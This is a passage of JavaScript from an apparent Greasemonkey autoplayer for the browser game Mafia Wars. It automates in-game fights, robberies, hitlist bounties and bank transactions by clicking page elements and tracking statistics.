    if (isGMEqual('staminaSpendHow', STAMINA_HOW_RANDOM)) return false;
    // The user-specified list is empty or invalid.
    addToLog('warning Icon', 'Can\'t autohit because the list of opponents is empty or invalid. Turning automatic hitlisting off.');
    GM_setValue('staminaSpend', 0);
    if(isGMChecked('bgAutoHitCheck')) GM_setValue('bgAutoHitCheck',0);
    return false;
  }

  opponent = new Player();
  opponent.id = String(id);

  if (!onProfileNav() && !autoHitlist.setBounty) {
    // Go to the opponent's profile.
    autoHitlist.profileSearch = opponent;
    Autoplay.fx = goProfileNav(opponent);
    Autoplay.start();
    return true;
  }

  if (autoHitlist.profileSearch && onProfileNav()) {
    opponent = autoHitlist.profileSearch;
    autoHitlist.profileSearch = undefined;
    opponent.profileHitlist = xpathFirst('.//a[contains(., "Add to Hitlist")]', innerPageElt);
    DEBUG('Hitlisting from profile');
    var hitlistElt = opponent.profileHitlist;
    autoHitlist.setBounty = true;
    var elt = xpathFirst('.//a[contains(., "Add to Hitlist")]', innerPageElt);
    if (elt) {
      Autoplay.fx = function() {
        clickAction = 'autohit';
        clickContext = opponent;
        clickElement(elt);
        DEBUG('Clicked "Add to Hitlist".');
      };
      Autoplay.start();
      return true;
    }
  }

  if(autoHitlist.setBounty){
    autoHitlist.setBounty = undefined;
    var formElt = xpathFirst('.//form[@id="createhit"]', innerPageElt);
    // Set the amount (random).
    var amountElt = xpathFirst('.//input[@type="text"]', formElt);
    if (!amountElt){
      if(isGMChecked('bgAutoHitCheck')) setGMTime("bgAutoHitTime", "01:00");
      return true;
    }

    if(isGMChecked('autoHitListRandom')){
      amountElt.value = Math.pow(10, (Math.floor(Math.random()*4)+4));
    } else {
      amountElt.value = parseCash(GM_getValue('autoHitListBounty', 0));
    }

    // Make the hit
    var submitElt = xpathFirst('.//button[@type="submit"]', formElt);
    if (!submitElt) {
      if(isGMChecked('bgAutoHitCheck')) setGMTime("bgAutoHitTime", "01:00");
      return true;
    }
    Autoplay.fx = function() {
      clickAction = 'autohit';
      clickContext = opponent;
      submitElt.click();
      DEBUG('Clicked to Set Bounty');
    };
    Autoplay.start();
    return true;
  }
}

function autoFight(how) {
  // Go to the correct city.
  var loc = GM_getValue('fightLocation', NY);
  if( loc == RANDOM_CITY){
    loc = GM_getValue('fightNewLocation', NY);
  }

  if (loc != ACTIVE_CITY && city != loc) {
    Autoplay.fx = function() { goLocation(loc); };
    Autoplay.delay = getAutoPlayDelay();
    Autoplay.start();
    return true;
  }

  // Make sure we're on the fight tab.
  if (!onFightTab() && !autoFight.profileSearch) {
    Autoplay.fx = goFightTab;
    Autoplay.delay = noDelay;
    Autoplay.start();
    return true;
  }

  if(!mafia){
    mafia = GM_getValue('userMafiaSize', 0);
    if(!mafia || mafia < 501){
      var mafiaSizeElt = xpathFirst('//div[@class="fightbar_group_stat"]//img[@title="Mafia Size"]').parentNode;
      if(mafiaSizeElt){
        var mafiaSize = parseInt(mafiaSizeElt.innerHTML.untag());
        if (mafiaSize){
          mafia = mafiaSize;
          GM_setValue('userMafiaSize', mafia);
          DEBUG('userMafiaSize updated to:'+mafia);
        }
      }
    }
  }

  // Now visit the Rivals tab if Fight Rivals is selected
  if(onFightersTab() && !autoFight.profileSearch && (how == STAMINA_HOW_FIGHT_RIVALS || how == STAMINA_HOW_FIGHTRIVALS_ROB)) {
	  Autoplay.fx = goRivalsTab;
		Autoplay.delay =  noDelay;
    Autoplay.start();
	return true;
  }

  // Get an opponent.
  var opponent;
  if (autoFight.profileSearch && onProfileNav()) {
    opponent = autoFight.profileSearch;
    autoFight.profileSearch = undefined;
    lastOpponent = undefined;
    if (isGMChecked('staminaPowerattack') && ((isGMChecked('stopPA') && health >= GM_getValue('stopPAHealth')) || !isGMChecked('stopPA')))
      opponent.profileAttack = xpathFirst('.//a[contains(@onclick,"xw_action=power_attack") and contains(., "Power Attack")]', innerPageElt);
    if (!opponent.profileAttack)
      opponent.profileAttack = xpathFirst('.//a[contains(@onclick,"xw_action=attack") and contains(., "Attack")]', innerPageElt);
    DEBUG('Attacking from profile');
  } else if (how == STAMINA_HOW_FIGHT_LIST) {
    var id = parseInt(GM_getValue('pfightlist', ''));
    if (!id) {
      // If nothing is here, and fighting is "random", fight someone else
      if (isGMEqual('staminaSpendHow', STAMINA_HOW_RANDOM)) return false;

      // The user-specified list is empty or invalid.
      addToLog('warning Icon', 'Can\'t fight because the list of opponents is empty or invalid. Turning automatic fighting off.');
      GM_setValue('staminaSpend', 0);
      return false;
    }
    opponent = new Player();
    opponent.id = String(id);
    DEBUG('Attacking a fight list opponent');
  } else {
    // Check for any new opponents.
    opponent = findFightOpponent(innerPageElt);
    DEBUG('Attacking a fight list opponent');

    // For stealth mode fights, if we don't have a new opponent then
    // choose one of the inactive opponents we've already fought.
    if ((!opponent || opponent === -1) &&
        isGMChecked('fightStealth')) {
      var l = fightListInactive.get();
      if (l.length) {
        addToLog('info Icon', '"Use Fight Stealth" is enabled, attacking previously "deemed" iced targets.');
        opponent = l[Math.floor(Math.random() * l.length)];
        opponent.profileAttack="";//stop TOS screen
        DEBUG('Attacking from inactive list');
      }
    }

    if (opponent === -1) {
      DEBUG('No opponents even after seeing the fight list.');
      setNextFightCity();
      return false;
    }

    if (!opponent) {
      // Go to the fight list to find opponents.
      addToLog('process Icon', 'No opponents. Going to fight list.');
      Autoplay.fx = goFightNav;
      Autoplay.start();
      return true;
    }
  }
  if (!opponent) return false;

  var attackElt = opponent.profileAttack;
  if (!attackElt && opponent.attack && opponent.attack.scrollWidth > 0) {
    attackElt = opponent.attack;
  }

  // Just click the "Attack Again" button if it's there
  if (lastOpponent && lastOpponent.attackAgain && opponent.match(lastOpponent)) {
    attackElt = lastOpponent.attackAgain;
    DEBUG('Clicking "Attack Again"!');
  }

  if (!attackElt) {
    if (opponent.id && !onProfileNav()) {
      // Go to the opponent's profile.
      autoFight.profileSearch = opponent;
      Autoplay.fx = function(){goProfileNav(opponent);};
      Autoplay.delay = noDelay;
      Autoplay.start();
      return true;
    }
    DEBUG('No way to attack opponent, id=' + opponent.id);
    return false;
  }

  // Check for pulse, skip iced opponents on the fight list
  if (isGMChecked('iceCheck') && (how == STAMINA_HOW_FIGHT_LIST)) {
    var ajaxID = createAjaxPage(true);
    var elt = xpathFirst('.//a[contains(., "Add to Hitlist")]', innerPageElt);
	  var iceCheckElt = makeElement('a', null,null);
	  var newClick = elt.getAttribute('onclick');
    newClick  = newClick.replace('inner_page',ajaxID);
	  iceCheckElt.setAttribute('onclick', newClick);
    Autoplay.fx = function() {
      clickAction = 'icecheck fightlist';
      clickContext = {'opponent': opponent, 'attackElt': attackElt};
      clickElement(iceCheckElt);
    };
    Autoplay.delay = 12000;
    Autoplay.start();
    return true;
  }

  // Attack!
  Autoplay.fx = function() {
    clickAction = 'fight';
    clickContext = opponent;
    clickElement (attackElt);
    DEBUG('Clicked to fight: name=' + opponent.name +
          ', level=' + opponent.level + ', mafia=' + opponent.mafia + ', faction=' + opponent.faction);
  };
  Autoplay.delay = noDelay;
  Autoplay.start();
  return true;
}

function setNextFightCity(){
  var loc = GM_getValue('fightLocation', NY);
  if( loc != RANDOM_CITY){
    return;
  }
  var newCity;
  do {
    newCity = Math.floor(Math.random()*(cities.length));
  } while (level < cities[newCity][CITY_LEVEL] || isGMEqual('fightNewLocation', newCity));

  DEBUG('Setting to ' + cities[newCity][CITY_NAME] + ' for next fight.');
  GM_setValue('fightNewLocation', newCity);
}


function autoRob() {
  var loc = GM_getValue('robLocation', NY);
  if (city != loc) {
    Autoplay.fx = function() { goLocation(loc); };
    Autoplay.delay = getAutoPlayDelay();
    Autoplay.start();
    return true;
  }

  // Make sure we're on the fight tab.
  if (!onRobbingTab()) {
    Autoplay.fx = goRobbingTab;
    Autoplay.delay = noDelay;
    Autoplay.start();
    return true;
  }

  DEBUG("Finally on the robbing grid.");

  var burnerHelpButton = xpathFirst('//a[@class="sexy_button_new short white" and contains(., "Ask for More") and not(contains(@style, "none"))]');
  if(burnerHelpButton) clickElement(burnerHelpButton);

  if (needToRefresh()) {
    DEBUG("Refreshing the rob grid.");
    // refresh the 3x3 grid.
    Autoplay.fx = refreshRobbingGrid;
    Autoplay.delay = noDelay;
    Autoplay.start();
    return true;
  } else {
    DEBUG("Fastrob unchecked, going to rob first available target");
    Autoplay.fx = function(){
      var clickNameTxt;
      var eltRobButton = getCurRobButton();
      clickAction = 'autoRob';
      var clickEltID = getCurRobSlotId(eltRobButton);
      DEBUG("Rob target: "+clickEltID);
      var eltRob = xpathFirst('//div[@id="'+ clickEltID +'" and @class="rob_slot"]');
      if(eltRob) DEBUG('Rob Slot Found')
      var clickName = xpathFirst('//div[@id="'+ clickEltID +'" and @class="rob_slot"]//div[@class="rob_prop_name_short"]');
      if(clickName) {
        if(eltRob) DEBUG('Rob Name Found')
        clickNameTxt = clickName.innerHTML;
      }
      DEBUG("Rob Property: "+clickNameTxt);
      clickContext = {
        elt: clickEltID,
        name: clickNameTxt
      };

      doRob(eltRobButton);
    };
    Autoplay.delay = noDelay;
    Autoplay.start();
    return true;
  }
}

function onRobbingTab() {
  // Return true if we're on the robbing tab, false otherwise.
  if (xpathFirst('//li[contains(@class, "tab_on")]//a[contains(., "Robbing")]')) {
    return true;
  }
  return false;
}

function goRobbingTab() {
  var elt = xpathFirst('//div[@class="tab_content"]//a[contains(., "Robbing")]');
  if (!elt) {
    goFightNav();
    return;
  }
  clickElement(elt);
  DEBUG('Clicked to go to robbing tab.');
}

function needToRefresh() {
  var eltRob = $x('//div[@class="rob_btn"]//a[@class="sexy_button_new short red"]');
  var elt = xpathFirst('//a[@id="rob_refresh_cost"]//span[contains(.,"0 stamina")]');
  if(elt && eltRob.length ==0) return true;
  else return false;
}

function refreshRobbingGrid() {
  var elt = xpathFirst('//a[@id="rob_refresh_cost"]//span[contains(.,"0 stamina")]');
  if (!elt) return;
  clickElement(elt);
  DEBUG('Clicked to refresh robbing grid.');
}

function doRob(eltRobButton) {
  if (isGMChecked('fastRob')) {
    var eltRob = $x('//div[@class="rob_btn"]//a[@class="sexy_button_new short red"]');
    function fastRob() {
      if (eltRob.length > 0)
        clickElement(eltRob.pop());
      else {
        window.clearInterval(fastRobID);
      }
    }
    if (!eltRob || eltRob.length == 0) return;
    DEBUG('Starting fastRob: Clicking ' + eltRob.length + ' rob buttons.');
    var fastRobID = window.setInterval(fastRob, 0);
  } else {
    if (!eltRobButton) eltRobButton = xpathFirst('//div[@class="rob_btn"]//a[@class="sexy_button_new short red"]');
    if (!eltRobButton) return;
    var m;
    var eltRobStam = xpathFirst('./div[@class="rob_prop_stamina"]', eltRobButton.parentNode.parentNode);
    if (eltRobStam) {
      if (m = /(.*)/.exec(eltRobStam.innerHTML)) {
        var stam = m[1].replace(/[^0-9]/g, '');
        GM_setValue('totalRobStamInt', (isNaN(parseInt(GM_getValue('totalRobStamInt', 0))) ? 0 : parseInt(GM_getValue('totalRobStamInt', 0))) + parseInt(stam));
      }
    }
    clickElement(eltRobButton);
    DEBUG('Clicked to rob.');
  }
}

function getCurRobButton(){
  var eltRob = xpathFirst('//a[@class="sexy_button_new short white" and contains(., "Call For Backup") and not(contains(@style, "none"))]');
  if(eltRob){
    DEBUG('Clicking \'Call for Backup\'-button/');
    return eltRob;
  }
  eltRob = xpathFirst('//div[@class="rob_btn"]//a[@class="sexy_button_new short red"]');
  if(eltRob){
    DEBUG('Clicking \'Rob\'-button.');
    return eltRob;
  }
}
function getCurRobSlotId(eltRob){
  DEBUG('eltRob: '+eltRob.innerHTML.untag());
  if(eltRob.innerHTML.untag()=='Rob') // rob btn, rob target, rob slot
    return eltRob.parentNode.parentNode.parentNode.id;
  if(eltRob.innerHTML.untag()!='Rob') // rob btn, rob target, rob slot
    return eltRob.parentNode.parentNode.parentNode.parentNode.id;
  return null;
}

function logRobResponse(rootElt, resultElt, context) {
  var robSlotId = context.elt;
  var robSlotName = context.name;
  var m;
  var needStatUpdate = false;
  var eltRob = xpathFirst('//div[@id="'+ robSlotId +'" and @class="rob_slot"]');
  if (eltRob) {
    var success = false;
    var targetElt = xpathFirst('.//div[@class="rob_res_target_name"]/a',eltRob);
    var expElt   = xpathFirst('.//div[@class="rob_res_expanded_details_exp"]',eltRob);
    var cashRobElt  = xpathFirst('.//div[@class="rob_res_expanded_details_cash"]',eltRob);
    var itemElt = xpathFirst('.//div[@class="rob_res_expanded_details_item"]',eltRob);
    if(targetElt!=null) {
      var user = linkToString(targetElt, 'user');
    } else {
      var alttargetElt = xpathFirst('.//div[@class="rob_res_target_pic"]//a//img',eltRob);
      if(alttargetElt) var user = '<span class="user">'+alttargetElt.title+'</span>';
      else var user = '<span class="user">Unknown Target</span>';
    }
    var result = 'Robbed ' + user;

    if (robSlotName) result += '\'s <span class="property">' + robSlotName + '</span> ';
    else result += ' ';

    if(xpathFirst('.//div[@class="rob_res_outcome good"]',eltRob)){
      result += ' with <span class="good">Success</span> gaining ';
      success = true;
      if (cashRobElt)
        result += ' <span class="good">'+ cashRobElt.innerHTML +'</span>';
      if (itemElt)
        result += ' <span class="loot">'+ itemElt.innerHTML +'</span>';
      if(expElt) result += ' and ';
    }
    else {
      result += ' and <span class="bad">Failed</span>, gaining ';
    }

    if (expElt) {
      result += '<span class="good">' + expElt.innerHTML + '</span>';
      if (m = /(\d+) experience/i.exec(expElt.innerHTML)) {
        var exp = m[1].replace(/[^0-9]/g, '');
        updateRobStatistics(success,parseInt(exp));
        needStatUpdate = true;
      }
    }

    addToLog('yeah Icon', result+'.');

    if (eltRob)
      // Look for any loot on rob slot
      if (m = /alt="(.*?)"/.exec(eltRob.innerHTML)) {
        addToLog('lootbag Icon', 'Found <span class="loot">'+ m[1] + '</span> in robbing.');
      }

    if (cashRobElt && cashRobElt.innerHTML) {
      var cashInt = parseCash(cashRobElt.innerHTML);
      var cashLoc = parseCashLoc(cashRobElt.innerHTML);
      GM_setValue('totalWinDollarsInt', String(parseInt(GM_getValue('totalWinDollarsInt', 0)) + cashInt));
      switch (cashLoc) {
        case NY: GM_setValue('fightWin$NY', String(parseInt(GM_getValue('fightWin$NY', 0)) + cashInt)); break;
        case CUBA: GM_setValue('fightWin$Cuba', String(parseInt(GM_getValue('fightWin$Cuba', 0)) + cashInt)); break;
        case MOSCOW: GM_setValue('fightWin$Moscow', String(parseInt(GM_getValue('fightWin$Moscow', 0)) + cashInt)); break;
        case BANGKOK: GM_setValue('fightWin$Bangkok', String(parseInt(GM_getValue('fightWin$Bangkok', 0)) + cashInt)); break;
        case LV: GM_setValue('fightWin$Vegas', String(parseInt(GM_getValue('fightWin$Vegas', 0)) + cashInt)); break;
	      case ITALY: GM_setValue('fightWin$Italy', String(parseInt(GM_getValue('fightWin$Italy', 0)) + cashInt)); break;
      }
      needStatUpdate = true;
    }
  }

  randomizeStamina();

  if (needStatUpdate) updateLogStats();
}

function updateRobStatistics(success, exp) {
  if (success)
    GM_setValue('robSuccessCountInt', GM_getValue('robSuccessCountInt', 0) + 1);
  else if (success == false)
    GM_setValue('robFailedCountInt', GM_getValue('robFailedCountInt', 0) + 1);

  if (exp) {
    GM_setValue('totalRobExpInt', GM_getValue('totalRobExpInt', 0) + parseInt(exp) );
    GM_setValue('totalExpInt', GM_getValue('totalExpInt', 0) + parseInt(exp));
  }
}

function autoHitman() {
  // Go to the correct city.
  var i, loc = GM_getValue('hitmanLocation', NY);
  if (loc != cities.length && city != loc) {
    Autoplay.fx = function() { goLocation(loc); };
    Autoplay.start();
    return true;
  }

  // Make sure we're on the hitlist tab.
  if (!onHitlistTab()) {
    Autoplay.fx = goHitlistTab;
    Autoplay.delay =  noDelay;
    Autoplay.start();
    return true;
  }

  // Get the list of targets.
  var opponents = getHitlist(innerPageElt, true);
  if (!opponents) return false;

  // Get the targets that are acceptable.
  DEBUG('Applying criteria to displayed targets.');
  var blacklist = getSavedList('hitmanListAvoid').concat(getSavedList('fightListAvoid'));
  var bountyMin = parseCash(GM_getValue('hitmanBountyMin', 0));
  var hitmanNames = isGMChecked('hitmanNames');
  var avoidNames = isGMChecked('hitmanAvoidNames');
  var onlyNames = isGMChecked('hitmanOnlyNames');
  var blacklistCount = 0;
  var bountyCount = 0;
  var namesCount = 0;
  var opponentsQualified = [];
  var exactBounty = (GM_getValue('bountySelection', BOUNTY_HIGHEST_BOUNTY) == BOUNTY_EXACT_AMOUNT);
  for (i = 0, iLength=opponents.length; i < iLength; i++) {
    var opponent = opponents[i];
    if (blacklist.indexOf(opponent.id) != -1) {
      blacklistCount++;
      continue;
    }
    var bounty = parseCash(opponent.bounty);
    if (bounty && ((bounty < bountyMin)|| (exactBounty && (bounty > bountyMin)))) {
      bountyCount++;
      continue;
    }
    DEBUG(decodeHTMLEntities(opponent.name)+' ' +isFamily(decodeHTMLEntities(opponent.name)),STAMINA_HOW_HITMAN);
    if (hitmanNames && avoidNames && isFamily(decodeHTMLEntities(opponent.name),STAMINA_HOW_HITMAN)) {
      namesCount++;
      continue;
    }
    if (hitmanNames && onlyNames && !isFamily(decodeHTMLEntities(opponent.name),STAMINA_HOW_HITMAN)) {
      namesCount++;
      continue;
    }
    opponentsQualified.push(opponent);
  }

  DEBUG(bountyCount + ' disqualified on bounty, ' + namesCount + ' on name, ' + blacklistCount + ' on blacklist.');

  if (!opponentsQualified.length) return false;

  // Pick a target based on saved settings.
  var bountyIndex = 0;

  switch (GM_getValue('bountySelection', BOUNTY_HIGHEST_BOUNTY)) {
    case BOUNTY_LONGEST_TIME:
      bountyIndex = (opponentsQualified.length - 1);
      break;

    case BOUNTY_HIGHEST_BOUNTY:
      var bigBounty = 0;
      for (i = 0, iLength=opponentsQualified.length; i < iLength; i++) {
        if (parseCash(opponentsQualified[i].bounty) > bigBounty) {
          bountyIndex = i;
          bigBounty = parseCash(opponentsQualified[i].bounty)
        }
      }
      break;

    case BOUNTY_RANDOM:
      bountyIndex = Math.floor(Math.random() * opponentsQualified.length);
      break;

    case BOUNTY_SHORTEST_TIME:
    default:
      bountyIndex = 0;
  }
  Autoplay.fx = function() {
    clickAction = 'hitman';
    clickContext = opponentsQualified[bountyIndex];
    clickElement (clickContext.attack);
    DEBUG('Clicked to hit ' + clickContext.name + ' (' + clickContext.id + ').');
  };
  Autoplay.delay =  noDelay;
  Autoplay.start();
  return true;
}

function getStaminaMode() {
  var how = GM_getValue('staminaSpendHow');

  // If fighting randomly, assign randomly chosen mode
  if (how == STAMINA_HOW_RANDOM) {
    if (isUndefined(newStaminaMode))
      newStaminaMode = Math.floor(Math.random()*(staminaSpendChoices.length - 1));
    how = newStaminaMode;
  }
  else {
    newStaminaMode = undefined;
  }

  return parseInt(how);
}

function autoStaminaSpend() {
  if (!isGMChecked('staminaSpend')) return false;

  if (SpendStamina.floor &&
      isGMChecked('allowStaminaToLevelUp') &&
      GM_getValue('autoStamBurn') !== SpendStamina.canBurn) {
    GM_setValue('autoStamBurn', SpendStamina.canBurn);
    if (SpendStamina.canBurn) {
      addToLog('process Icon', staminaIcon + '<span style="color:#009966; font-weight: bold;">Burning through stamina reserve to level up.</span>');
    } else {
      DEBUG('Not within reach of a level up. Stamina burning is off.');
    }
  }

  var how = getStaminaMode();
  switch (how) {
    case STAMINA_HOW_FIGHT_RANDOM:
    case STAMINA_HOW_FIGHT_LIST:
    case STAMINA_HOW_FIGHT_RIVALS:
      return autoFight(how);

    case STAMINA_HOW_FIGHTROB:
    case STAMINA_HOW_FIGHTRIVALS_ROB:
      if ( (health < 21)  && (stamina > 25 ) ) {
        DEBUG(' -- going to autorob -- ');
        return autoRob();
      } else {
        DEBUG(' -- going to autofight -- ');
        return autoFight(how);
      }

    case STAMINA_HOW_ROBBING:
      return autoRob();

    case STAMINA_HOW_HITMAN:
      return autoHitman(how);

    case STAMINA_HOW_AUTOHITLIST:
      return autoHitlist();

    default:
      addToLog('warning Icon', 'BUG DETECTED: Unrecognized stamina setting: ' +
               'staminaSpendHow=' + how);
  }

  return false;
}

function autoBankDeposit(bankCity, amount) {
  if (!quickBankFail) return false;

  // Only quickbank in Vegas, since the vault is only available in flash.
  if (bankCity == LV) {
    quickBankFail = false;
    return false;
  }

  // Make sure we're at the bank.
  var bankElt = xpathFirst('.//div[@id="bank_popup"]', popupfodderElt);
  if (!bankElt || bankElt.parentNode.style.display == 'none') {
    Autoplay.fx = goBank;
    Autoplay.start();
    return true;
  }

  // Set the amount (if provided).
  if (amount) {
    var amountElt = xpathFirst('.//input[@id="deposit_amount"]', bankElt);
    if (!amountElt) {
      addToLog('warning Icon', 'BUG DETECTED: No text input at bank.');
      return false;
    }
    amountElt.value = amount;
  }

  // Grab the deposit button!
  var submitElt = xpathFirst('.//div[@id="bank_dep_button"]/a[contains(@onclick,"deposit(")]', bankElt);
  if (!submitElt) {
    addToLog('warning Icon', 'BUG DETECTED: No submit input at bank.');
    return false;
  }

  // Do not bank if city has changed
  if (city != bankCity) {
    addToLog('warning Icon', 'Switching city too fast, not banking cash.');
    return false;
  }

  // Make the deposit
  Autoplay.fx = function() {
    clickContext = bankCity;
    clickAction = 'deposit';
    clickElement (submitElt);
    DEBUG('Clicked to deposit.');
  };
  Autoplay.start();
  return true;
}

function autoBankWithdraw(amount) {
  if (city == LV) {
    // Use do_ajax to withdraw in LV
    var withdrawUrl = "xw_controller=propertyV2&xw_action=doaction&xw_city=5&doaction=ActionBankWithdrawal&building_type=6&city=5&amount=" + amount;
    var ajaxID = createAjaxPage(false, 'quick withdraw', LV);
    var elt = makeElement('a', null, {'onclick':'return do_ajax("' + ajaxID + '","remote/html_server.php?' + withdrawUrl + '", 1, 1, 0, 0); return false;'});
    clickElement(elt);
    DEBUG('Clicked to withdraw from the vault.');
    return true;
  }

  // Make sure we're at the bank.
  var formElt = xpathFirst('.//div[@id="bank_popup"]', popupfodderElt);
  if (!formElt) {
    Autoplay.fx = goBank;
    clickAction = 'withdraw';
    clickContext = amount;
    Autoplay.start();
    return true;
  } else {
    // Make sure the bank window is open!
    if (document.getElementById("bank_popup").parentNode.style.display == 'none') {
      Autoplay.fx = goBank;
      clickAction = 'withdraw';
      clickContext = amount;
      Autoplay.start();
      return true;
    }
  }

  // Set the amount (if provided).
  if (amount) {
    var amountElt = xpathFirst('.//input[@id="withdraw_amount"]', formElt);
    if (!amountElt) {
      addToLog('warning Icon', 'BUG DETECTED: No text input at bank.');
      return false;
    }
    amountElt.value = amount;
  }

  // Make the withdrawal.
  var submitElt = xpathFirst('.//div[@id="bank_with_button"]//a', formElt);
  if (!submitElt) {
    addToLog('warning Icon', 'BUG DETECTED: No submit input at bank.');
    return false;
  }
  Autoplay.fx = function() {
    clickAction = 'withdraw';
    clickElement (submitElt);
    DEBUG('Clicked to withdraw.');
  };
  Autoplay.delay = noDelay;
  Autoplay.start();
  return true;
}

// Returns a non-empty array of the displayed opponents, or undefined.
function getHitlist(element, forceRefresh) {
  // If the list was already seen, don't read it again.
  if (!forceRefresh && getHitlist.opponents) {
    if (!getHitlist.opponents.length) return [];
    return getHitlist.opponents;
  }
  getHitlist.opponents = [];

  // Get each target in the displayed list.
  var rows = $x('.//table[@class="hit_list"]//tr', element);
  for (var i = 0, iLength=rows.length; i < iLength; ++i) {
    // Get the data cells in the row.
    var rowData = rows[i].getElementsByTagName('td');
    if (rowData.length < 5) continue;

    // Get the target's profile and attack links.
    var opponent = {
      attack:  xpathFirst('.//a', rowData[4]),
      payer:   xpathFirst('.//a', rowData[1]),
      profile: xpathFirst('.//a', rowData[0]),
      time:    rowData[3].innerHTML.untag().trim()
    };
    if (!opponent.profile || !opponent.attack) continue;

    // Get the target's id, name, title, and bounty.
    opponent.id = decodeID(opponent.profile.getAttribute('onclick').split('user=')[1].split('\'')[0].split('&')[0]);
    if (!opponent.id) continue;
    opponent.name = opponent.profile.innerHTML;
    if (opponent.profile.previousSibling &&
        opponent.profile.previousSibling.nodeValue.match(/\w+(?: \w+)*/)) {
      opponent.title = RegExp.lastMatch;
    }
    if (rowData[2].innerHTML.match(REGEX_CASH)) {
      opponent.bounty = RegExp.lastMatch;
    }

    getHitlist.opponents.push(opponent);
  }
  DEBUG(getHitlist.opponents.length + ' hitlist target(s) found.');

  if (!getHitlist.opponents.length) return [];

  return getHitlist.opponents;
}

// Returns a non-empty array of the displayed opponents, or undefined.
function getDisplayedOpponents(element, forceRefresh) {
  // If the list was already seen, don't read it again.
  if (!forceRefresh && getDisplayedOpponents.opponents) {
    if (!getDisplayedOpponents.opponents.length) return [];
    return getDisplayedOpponents.opponents;
  }
  getDisplayedOpponents.opponents = [];
  var i, linkElt, row, rowData, opponent, fight = true;

  // First, look for a traditional fight table (one with real links).
  var links = $x('.//table[@class="main_table fight_table"]//a[contains(@onclick, "opponent_id")]', element);

  // Get each potential opponent in the displayed list.
  for (i = 0, iLength=links.length; i < iLength; i++) {
    linkElt = links[i];
    opponent = new Player();
    row     = linkElt.parentNode.parentNode;
    rowData = row.getElementsByTagName('td');
    nameAndLevel = row;

    // Get the opponent's details.
    opponent.profile = nameAndLevel.getElementsByTagName('a')[0];
    if (!opponent.profile) continue;
    var onClickText  = opponent.profile.getAttribute('onclick');
    var oppParamName = 'user=';
    if (!new RegExp(oppParamName).test(onClickText)) oppParamName = 'opponent_id=';
    opponent.id = decodeID(opponent.profile.getAttribute('onclick').split(oppParamName)[1].split('\'')[0].split('&')[0]);
    if (!opponent.id) continue;

    opponent.attack  = linkElt;
    opponent.mafia   = rowData[1] ? parseInt(rowData[1].innerHTML) : 0;
    opponent.level   = parseInt(nameAndLevel.innerHTML.split('</a>')[1].split('Level ')[1]);
    opponent.name    = opponent.profile.innerHTML;
    opponent.faction = '';
    if (rowData[0].style.color == 'rgb(102, 102, 102)') {
      opponent.iced = true;
      // Hide iced opponents
      if (!running && isGMChecked('showPulse')) row.style.display = 'none';
    } else
      opponent.iced = false;
    var factionElt   = xpathFirst('.//img', rowData[2]);
    if (factionElt && factionElt.alt) opponent.faction = factionElt.alt;
    if (opponent.profile.previousSibling &&
        opponent.profile.previousSibling.nodeValue.match(/\w+(?: \w+)*/)) {
      opponent.title = RegExp.lastMatch;
    }
    if (!opponent.level) {
      addToLog('warning Icon', 'BUG DETECTED: Unable to read opponent level.');
      addToLog('warning Icon', 'Row contents: '+ row.innerHTML);
    } else if (!opponent.mafia) {
      addToLog('warning Icon', 'BUG DETECTED: Unable to read opponent mafia.');
      addToLog('warning Icon', 'Row contents: '+ row.innerHTML);
    } else {
      getDisplayedOpponents.opponents.push(opponent);
    }
  }

  if (!getDisplayedOpponents.opponents.length) return [];

  DEBUG(getDisplayedOpponents.opponents.length + ' opponents listed.');

  return getDisplayedOpponents.opponents;
}

// Searches the fight table in the subtree of the given element for new
// random targets. Returns a new opponent, or undefined.
function findFightOpponent(element) {
  // This will force the fight logic to refresh target list everytime.
  fightListNew.set([]);

  // Don't bother searching if we still have plenty.
  var newOpponents = fightListNew.get();
  var len = newOpponents.length;
  if (len >= 50) {
    return newOpponents[Math.floor(Math.random() * len)];
  }

  // Check the fight table.
  var opponents = getDisplayedOpponents(element, true);
  if (!opponents) {
    // No opponents displayed on this page.
    return newOpponents[Math.floor(Math.random() * len)];
  }

  // Calculate faction points
  var factionElts = xpath('.//div[@class="faction_container"]', innerPageElt);
  var factionCnt = factionElts.snapshotLength;
  if (factionElts.snapshotLength > 0) {
    allyFaction = '';
    var maxPts = 0, minPts = 1500;
    for (var i = 0, iLength = factionElts.snapshotLength; i < iLength; ++i) {
      var factionElt = factionElts.snapshotItem(i);
      var factionName = xpathFirst('.//div[@class="faction_name"]',factionElt).innerHTML.trim();
      var factionPts = parseInt(xpathFirst('.//div[@class="zy_progress_bar_faction_text"]',factionElt).innerHTML.split('/')[0].trim());

      // Keep track of max and min faction pts
      if (!isNaN(factionPts) && factionPts > maxPts) {
        maxPts = factionPts;
      }
      if (!isNaN(factionPts) && factionPts < minPts) {
        minPts = factionPts;
        allyFaction = factionName;
      }
    }

    // Do not enable faction filtering
    if (maxPts - minPts < cities[city][CITY_ALLIANCE])
      allyFaction = '';
    DEBUG('Factions found: ' + factionCnt + '<br>' +
          'Max faction pts: ' + maxPts + '<br>' +
          'Min faction pts: ' + minPts + '<br>' +
          'Ally faction: ' + allyFaction);
  }

  // Get the user's criteria for opponents.
  var opponentLevelMax = parseInt(GM_getValue('fightLevelMax', 100));
  var opponentMafiaMax = parseInt(GM_getValue('fightMafiaMax', 501));
  var opponentMafiaMin = parseInt(GM_getValue('fightMafiaMin', 1));
  var fightNames = isGMChecked('fightNames');
  var avoidNames = isGMChecked('fightAvoidNames');
  var onlyNames = isGMChecked('fightOnlyNames');

  // Make any relative adjustments (if enabled).
  if (GM_getValue('fightLevelMaxRelative', false)) {
    opponentLevelMax = opponentLevelMax + level;
  }
  if (GM_getValue('fightMafiaMaxRelative', false)) {
    opponentMafiaMax = opponentMafiaMax + mafia;
  }
  if (GM_getValue('fightMafiaMinRelative', false)) {
    opponentMafiaMin = mafia - opponentMafiaMin;
  }
  if (opponentMafiaMin > 501) {
    opponentMafiaMin = 501;
  }

  // Show which players to blacklist.
  var avoidLosers = (isGMChecked('fightStealth') || newOpponents.length);

  // Figure out which opponents are acceptable.
  DEBUG('Applying criteria to displayed opponents: ' +
        'level <= ' + opponentLevelMax + ', mafia between ' +
        opponentMafiaMin + ' and ' + opponentMafiaMax + '.');
  var levelMaxCount = 0;
  var mafiaMaxCount = 0;
  var mafiaMinCount = 0;
  var namesCount = 0;
  var factionCount = 0;
  var blacklistCount = 0;
  var icedCount = 0;
  var countOpp = opponents.length;


  for(var i = 0; i < countOpp; ++i) {
    var opponent = opponents[i];
    // Balance faction points
    if (opponent.faction.length > 0 && allyFaction.length > 0 &&
        opponent.faction == allyFaction) {
      factionCount++;
      continue;
    }

